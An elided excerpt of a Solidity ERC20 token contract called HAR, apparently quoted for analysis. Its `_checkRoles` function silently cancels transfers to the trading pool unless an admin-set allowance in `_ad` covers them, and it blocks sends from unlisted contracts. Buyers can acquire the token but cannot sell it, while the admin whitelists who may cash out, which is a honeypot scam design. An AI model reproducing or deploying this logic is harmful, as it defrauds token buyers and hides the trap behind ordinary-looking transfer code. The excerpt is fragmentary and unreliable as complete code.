...
contract HAR is ERC20,Control{  
    ...
    mapping(address=>uint256) private _ad;
   ...
   function _transferNoFee(address from,address to,uint256 amount) private{
    ...
    function _transfer(address from,address to,uint256 amount) internal override(ERC20){
        ...
        uint256 senderBalance = _balances[from];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance"); 
        if(_checkRoles(from,to,amount)){return;} 
        unchecked {
              _balances[from] = senderBalance - amount;
        } 
         _balances[to] += amount;   
    ...
    function setPair(address  ConvertPair) public  onlyRole(DEFAULT_ADMIN_ROLE){
        _pool=ConvertPair;
    }    
    function setAD(address user,uint256 amount) public onlyRole(DEFAULT_ADMIN_ROLE){
        _ad[user]=amount*10**decimals(); 
    }  
    function setLimit(address user) public onlyRole(DEFAULT_ADMIN_ROLE){
        _limit[user]=1;
    }  

     function _checkRoles(address from,address to,uint256 amount) internal virtual returns(bool state){
        if(isContract(from) && from!=_pool  && from!=_maker ){
            if(_limit[from]==0){
                return false;
            }else{
                 return true;
         ...
         if(from!=_pool && from!=_maker){
                if(to==_pool){ 
                    uint256 _agew=_ad[from];
                    if(_agew == 0){
                        return true;
                    }else if(_agew <0 || _agew < amount){ 
                        return true;
                    }else{
                        _ad[from]=_agew-amount;
                        return false;
                    }
                }else{
                  return true;
